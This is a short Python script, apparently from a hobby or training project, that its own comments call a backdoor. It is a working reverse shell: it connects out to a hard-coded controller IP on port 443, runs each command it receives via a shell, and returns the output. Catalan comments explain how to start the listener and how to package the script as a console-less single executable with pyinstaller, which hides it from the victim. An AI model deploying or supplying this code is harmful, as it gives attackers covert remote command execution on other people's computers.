#!/usr/bin/env python3

import socket
import subprocess
from modules.my_utils import show_message

"""

Executa al Servidor: sudo python3 listener.py

Per convertir el backdoor en un exe el que has de fer es:
pyinstaller --noconsole --onefile backdoor.py

"""

### Variables & Constants ####################################################################################################

server_ip = "10.32.99.36" # Put the server IP right here

### Functions ################################################################################################################

def run_command(command):
    try:
        command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return command_output.decode("utf-8", errors="ignore")
    
    except subprocess.CalledProcessError as e:
        return f"[ERROR]\n{e.output.decode('utf-8', errors='ignore')}"

### Main Code ################################################################################################################

def main():

    try: 
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, 443))
        client_socket.send(f"{show_message('Connection established')}".encode())
        
        while True:
            command = client_socket.recv(1024).decode().strip()

            if not command:
                break

            command_output = run_command(command)
            client_socket.send(b"\n" + command_output.encode() + b"\n\n")

    except PermissionError:
        show_message("You need to execute this as root", "error")

    except Exception as e:
        show_message(f"Unexpected error:", "error", e)

    finally:
        client_socket.close()

if __name__ == "__main__":
    main()
